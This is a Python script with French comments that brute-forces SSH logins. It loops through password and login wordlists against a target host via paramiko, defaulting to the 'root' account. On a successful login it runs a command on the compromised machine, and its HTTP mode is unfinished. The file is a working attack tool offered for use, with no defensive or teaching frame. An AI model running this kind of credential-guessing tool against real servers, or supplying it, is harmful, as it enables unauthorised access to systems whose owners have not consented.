#C:/ProgramData/Anaconda3/python.exe


#------------------------------------------------------------------------------------------
#Pb que j'ai:  
# J'en ai pas :) enfin plus
#Sinon le butfroce fonction
#------------------------------------------------------------------------------------------


import readline
import sys
import paramiko


ssh_client = paramiko.SSHClient()
count_ligne_pass= 0
count_ligne_login= 0

# On regarde si il y a plus de 0 arguements
Nb_Arg = len((sys.argv))
if Nb_Arg > 0 :
    Nb_Arg = Nb_Arg - 1 # pour avoir alors le meme nombre d'argument que leurs nom

# On regarde si il y a assez d'arguements
if Nb_Arg == 0 :
    print ("Le scrpit prend les agruments suivant : protocole (http, ssh), url (ip ou url de connection), dictionnaire de password, dictionnaire login (facultatif) ")
    quit ("Fin du programme")
elif Nb_Arg <= 2 : 
    print ("Le scrpit prend les agruments suivant : protocole (http, ssh), url (ip ou url de connection), dictionnaire de password, dictionnaire login (facultatif) ")
    quit ('Fin du programme')


#fonction qui prends verifie les arguement
if sys.argv[1] == "ssh": #fonction faire des requet ssh avec la ligne du dico
    proto="ssh"
    def requet_ssh(password, login):        
        # A voir ce que fait la ligne avant
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try: # Ligne de tentative de connection
            ssh_client.connect(hostname=url, username=login, password=password, auth_timeout=1)

        except:
            print("Test de connection qui a echoué avec",login,":", password)

        else:
            print ("Connection reussi sur la machine", url, "avec les credentials", login, ":", password)
            ssh_client.exec_command('touch ssh')# pour validé que la commande marche
            quit()
elif sys.argv[1] == "http":
    print ("Le brutforce sur le http n'est pas encore operationelle")
    quit()


else : 
    print("Il n'y a pas de protocole valable, séléctionner http ou ssh")
    sys.exit



#ftest si il y a une URL
if Nb_Arg >= 2:
    url = sys.argv[2]
else : 
    print("Il y a pas d'URL pour l'attques")
    sys.exit 

# On lis ligne par ligne si il y a un dictionnaire
if Nb_Arg >= 3 :
    try :
        passdico = open(sys.argv[3]).read().splitlines()
    except : 
        print ("le dictionnaire non lisible ou n'existe pas")
        quit()

# Verifie si y a un dico de password
if Nb_Arg <= 2: 
    print ("Il n'y a pas de dictionnaire de password,  il faut en mettre un !!")


# Si y a pas de diconnaire de login
if Nb_Arg == 3 :

    for password in passdico :

        if sys.argv[1] == "ssh":
            requet_ssh(password,"root") # appel de fonction request ssh


# Si il y a un dictionnaire de login
if Nb_Arg >= 4 :
    try :
        logdico = open(sys.argv[4]).read().splitlines()
    except :
        print("le dictionnaire n'existe pas ou n'est pas lisible")
        quit()
    for login in logdico :
        for password in passdico :            
            if sys.argv[1] == "ssh":
                requet_ssh(password,login)
